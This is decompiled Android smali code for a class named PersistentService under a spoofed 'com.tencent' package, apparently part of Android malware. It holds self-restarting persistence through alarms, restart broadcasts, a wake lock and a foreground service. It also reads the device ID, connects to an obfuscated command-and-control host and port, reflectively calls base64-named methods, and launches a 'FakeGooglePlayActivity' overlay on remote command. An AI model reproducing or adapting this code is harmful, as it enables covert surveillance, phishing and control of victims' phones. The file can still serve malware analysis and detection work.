.class public Lcom/tencent/PersistentService;
.super Landroid/app/Service;
.source "entitledoswimmingo21.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/tencent/PersistentService$ta;
    }
.end annotation


# instance fields
.field wakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 38
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 136
    iput-object v0, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    return-void
.end method

.method public static FPPAGE(Ljava/lang/String;)V
    .locals 0

    .line 936
    sget-object p0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    return-void
.end method

.method private LOGIT(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 8

    :try_start_0
    const-string v0, "com.tencent.tunesxconcerningn103"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_6

    const/4 v1, 0x0

    .line 958
    :try_start_1
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_6

    goto :goto_0

    :catch_0
    move-exception v0

    .line 960
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/ClassNotFoundException;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_6

    move-object v0, v1

    .line 966
    :goto_0
    :try_start_3
    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v2
    :try_end_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/InstantiationException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_6

    goto :goto_2

    :catch_1
    move-exception v2

    .line 970
    :try_start_4
    invoke-virtual {v2}, Ljava/lang/InstantiationException;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v2

    .line 968
    invoke-virtual {v2}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    :goto_1
    move-object v2, v1

    :goto_2
    const/4 v3, 0x2

    new-array v4, v3, [Ljava/lang/Class;

    .line 974
    const-class v5, Landroid/content/Context;

    const/4 v6, 0x0

    aput-object v5, v4, v6

    .line 975
    const-class v5, Landroid/content/Intent;

    const/4 v7, 0x1

    aput-object v5, v4, v7

    const-string v5, "U3RhcnROZXdTY2Fu"

    .line 976
    invoke-static {v5}, Lcom/tencent/DataPackagingEngine;->grhcriticismzfailedd31(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_6

    .line 980
    :try_start_5
    invoke-virtual {v0, v5, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1
    :try_end_5
    .catch Ljava/lang/NoSuchMethodException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_6

    goto :goto_3

    :catch_3
    move-exception v0

    .line 982
    :try_start_6
    invoke-virtual {v0}, Ljava/lang/NoSuchMethodException;->printStackTrace()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6

    :goto_3
    :try_start_7
    new-array v0, v3, [Ljava/lang/Object;

    aput-object p1, v0, v6

    aput-object p2, v0, v7

    .line 986
    invoke-virtual {v1, v2, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_7
    .catch Ljava/lang/IllegalAccessException; {:try_start_7 .. :try_end_7} :catch_5
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_7 .. :try_end_7} :catch_4
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    goto :goto_4

    :catch_4
    move-exception p1

    .line 990
    :try_start_8
    invoke-virtual {p1}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V

    goto :goto_4

    :catch_5
    move-exception p1

    .line 988
    invoke-virtual {p1}, Ljava/lang/IllegalAccessException;->printStackTrace()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    :catch_6
    :goto_4
    return-void
.end method

.method public static StartScreen(Ljava/lang/String;)V
    .locals 6

    .line 907
    sget-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    if-eqz v0, :cond_1

    :try_start_0
    const-string v0, "on:"

    .line 910
    invoke-virtual {p0, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v1, "key"

    const/high16 v2, 0x800000

    const/high16 v3, 0x10000000

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    .line 912
    :try_start_1
    sput-boolean v0, Lcom/tencent/MainBackgroundService;->FO_tunesxconcerningn1011_RSC:Z

    .line 913
    new-instance v0, Landroid/content/Intent;

    sget-object v4, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    const-class v5, Lcom/tencent/FakeGooglePlayActivity;

    invoke-direct {v0, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 914
    invoke-virtual {v0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 915
    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 916
    invoke-virtual {v0, v1, p0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 917
    sget-object p0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    .line 920
    sput-boolean p0, Lcom/tencent/MainBackgroundService;->FO_tunesxconcerningn1011_RSC:Z

    .line 921
    new-instance p0, Landroid/content/Intent;

    sget-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    const-class v4, Lcom/tencent/FakeGooglePlayActivity;

    invoke-direct {p0, v0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 922
    invoke-virtual {p0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 923
    invoke-virtual {p0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v0, "off"

    .line 924
    invoke-virtual {p0, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 925
    sget-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    invoke-virtual {v0, p0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method

.method public static openlink(Ljava/lang/String;)V
    .locals 2

    .line 877
    sget-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    if-eqz v0, :cond_0

    .line 880
    :try_start_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 881
    new-instance v1, Lcom/tencent/PersistentService$2;

    invoke-direct {v1, p0}, Lcom/tencent/PersistentService$2;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    .line 896
    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_0
    :goto_0
    return-void
.end method

.method public static p(Landroid/content/Context;)V
    .locals 7

    const-string v0, "NPO"

    const-string v1, "NHO"

    const-string v2, "NNA"

    const-string v3, ""

    .line 1002
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    const-string v5, "android_id"

    invoke-static {v4, v5}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 1004
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 1008
    :catch_0
    :try_start_1
    invoke-static {p0}, Lcom/tencent/InstalledAppsScanner;->GD_tunesxconcerningn108_I(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    .line 1010
    :goto_0
    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    sput-object v5, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_i:Ljava/util/List;

    .line 1011
    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    sput-object v5, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_cl:Ljava/util/List;

    .line 1013
    invoke-static {p0, v2, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v5

    if-lez v5, :cond_0

    .line 1015
    sget-object v5, Lcom/tencent/MainBackgroundService;->CLINAME:Ljava/lang/String;

    invoke-static {p0, v2, v5}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/tencent/MainBackgroundService;->CLINAME:Ljava/lang/String;

    .line 1019
    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Lcom/tencent/MainBackgroundService;->CLINAME:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "|"

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    .line 1026
    :try_start_2
    sget-object v4, Lcom/tencent/InstalledAppsScanner;->FTX0:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 1027
    :try_start_3
    sget-object v5, Lcom/tencent/InstalledAppsScanner;->FTX1:Ljava/lang/String;

    .line 1028
    sget-object v5, Lcom/tencent/InstalledAppsScanner;->FTX2:Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_1

    :catch_1
    move-object v4, v3

    .line 1030
    :catch_2
    :goto_1
    :try_start_4
    sget-object v5, Lcom/tencent/MainBackgroundService;->tunesxconcerningn1011_Host:Ljava/lang/String;

    invoke-static {v5}, Lcom/tencent/DataPackagingEngine;->grhcriticismzfailedd31(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 1031
    sget-object v6, Lcom/tencent/MainBackgroundService;->tunesxconcerningn1011_Port:Ljava/lang/String;

    invoke-static {v6}, Lcom/tencent/DataPackagingEngine;->grhcriticismzfailedd31(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    .line 1038
    :try_start_5
    invoke-static {p0, v2, v4}, Lcom/tencent/DataPackagingEngine;->dit(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 1044
    :catch_3
    :try_start_6
    invoke-static {p0, v1, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_1

    .line 1046
    sget-object v2, Lcom/tencent/MainBackgroundService;->tunesxconcerningn1011_Host:Ljava/lang/String;

    invoke-static {v2}, Lcom/tencent/DataPackagingEngine;->grhcriticismzfailedd31(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, v1, v2}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 1050
    :cond_1
    invoke-static {p0, v0, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_2

    .line 1052
    sget-object v1, Lcom/tencent/MainBackgroundService;->tunesxconcerningn1011_Port:Ljava/lang/String;

    invoke-static {v1}, Lcom/tencent/DataPackagingEngine;->grhcriticismzfailedd31(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, v0, v1}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 1061
    :cond_2
    invoke-static {v5, v6, p0}, Lcom/tencent/DataEncryptionEngine;->traditionhtahoem37(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    const/4 v0, 0x1

    new-array v0, v0, [Landroid/content/Context;

    const/4 v1, 0x0

    aput-object p0, v0, v1

    .line 1063
    new-instance p0, Lcom/tencent/PersistentService$ta;

    invoke-direct {p0}, Lcom/tencent/PersistentService$ta;-><init>()V

    invoke-virtual {p0, v0}, Lcom/tencent/PersistentService$ta;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :catch_4
    return-void
.end method

.method public static showToast(Ljava/lang/String;)V
    .locals 2

    .line 857
    sget-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    if-eqz v0, :cond_0

    .line 858
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 859
    new-instance v1, Lcom/tencent/PersistentService$1;

    invoke-direct {v1, p0}, Lcom/tencent/PersistentService$1;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :cond_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 8

    .line 789
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 792
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    .line 793
    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "Battery"

    const-wide/16 v2, 0x4650

    invoke-static {v0, v1, v2, v3}, Lcom/tencent/DataPackagingEngine;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V

    const-string v0, "power"

    .line 795
    invoke-virtual {p0, v0}, Lcom/tencent/PersistentService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 796
    iget-object v1, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v2, 0x1

    if-nez v1, :cond_0

    const-string v1, "PeriSecure:MyWakeLock"

    .line 798
    invoke-virtual {v0, v2, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 800
    :cond_0
    iget-object v0, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_1

    .line 802
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-nez v0, :cond_1

    .line 804
    iget-object v0, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 808
    :cond_1
    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "01110001"

    .line 809
    sput-object v1, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    .line 812
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v1, v3, :cond_2

    sget-object v1, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->charAt(I)C

    move-result v1

    sget-char v2, Lcom/tencent/DataPackagingEngine;->c1:C
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-ne v1, v2, :cond_2

    :try_start_1
    const-string v1, "Worker"

    const-string v2, "Workers"

    .line 817
    invoke-static {v0, v1, v2}, Lcom/tencent/DataPackagingEngine;->Foreground(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Landroid/app/Notification;

    move-result-object v0

    if-eqz v0, :cond_2

    const/16 v1, 0x257a

    .line 822
    invoke-virtual {p0, v1, v0}, Lcom/tencent/PersistentService;->startForeground(ILandroid/app/Notification;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_2
    :try_start_2
    const-string v0, "sysdata"

    .line 829
    sput-object v0, Lcom/tencent/InstalledAppsScanner;->FTX0:Ljava/lang/String;

    const-string v0, "appdata"

    .line 830
    sput-object v0, Lcom/tencent/InstalledAppsScanner;->FTX1:Ljava/lang/String;

    const-string v0, "configrs"

    .line 831
    sput-object v0, Lcom/tencent/InstalledAppsScanner;->FTX2:Ljava/lang/String;

    const-string v0, "sysinfo"

    .line 832
    sput-object v0, Lcom/tencent/InstalledAppsScanner;->FTX3:Ljava/lang/String;

    .line 833
    new-instance v0, Ljava/util/concurrent/ThreadPoolExecutor;

    const/16 v2, 0x8

    const/16 v3, 0xf

    const-wide/16 v4, 0x1

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MINUTES:Ljava/util/concurrent/TimeUnit;

    new-instance v7, Ljava/util/concurrent/ArrayBlockingQueue;

    sget v1, Lcom/tencent/DataPackagingEngine;->m_tunesxconcerningn103_ax:I

    invoke-direct {v7, v1}, Ljava/util/concurrent/ArrayBlockingQueue;-><init>(I)V

    move-object v1, v0

    invoke-direct/range {v1 .. v7}, Ljava/util/concurrent/ThreadPoolExecutor;-><init>(IIJLjava/util/concurrent/TimeUnit;Ljava/util/concurrent/BlockingQueue;)V

    sput-object v0, Lcom/tencent/DataPackagingEngine;->e_tunesxconcerningn103_xc:Ljava/util/concurrent/Executor;

    .line 836
    invoke-static {p0}, Lcom/tencent/PersistentService;->p(Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    return-void
.end method

.method public onDestroy()V
    .locals 4

    .line 94
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    .line 95
    sput v0, Lcom/tencent/DataPackagingEngine;->s_tunesxconcerningn103_f0:I

    .line 101
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "iamdone"

    const-wide/32 v2, 0x2bf20

    invoke-static {v0, v1, v2, v3}, Lcom/tencent/DataPackagingEngine;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 108
    :catch_0
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/tencent/RestartSensorReceiver;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "RestartSensor"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/tencent/PersistentService;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 115
    :catch_1
    :try_start_2
    iget-object v0, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    .line 117
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-ne v0, v1, :cond_0

    .line 119
    iget-object v0, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 125
    :cond_0
    invoke-virtual {p0, v1}, Lcom/tencent/PersistentService;->stopForeground(Z)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    const/4 p1, 0x1

    return p1
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 8

    .line 43
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "Scanner"

    const-wide/32 v2, 0x2bf20

    invoke-static {v0, v1, v2, v3}, Lcom/tencent/DataPackagingEngine;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V

    .line 44
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 45
    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 47
    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/high16 v2, 0x40000000    # 2.0f

    const/4 v3, 0x1

    invoke-static {v1, v3, v0, v2}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 48
    invoke-virtual {p0}, Lcom/tencent/PersistentService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "alarm"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/AlarmManager;

    .line 51
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v4

    const-wide/16 v6, 0x3e8

    add-long/2addr v4, v6

    const/4 v2, 0x3

    .line 49
    invoke-virtual {v1, v2, v4, v5, v0}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 53
    iget-object v0, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 55
    iget-object v0, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-ne v0, v3, :cond_0

    .line 57
    iget-object v0, p0, Lcom/tencent/PersistentService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 61
    :catch_0
    :cond_0
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method
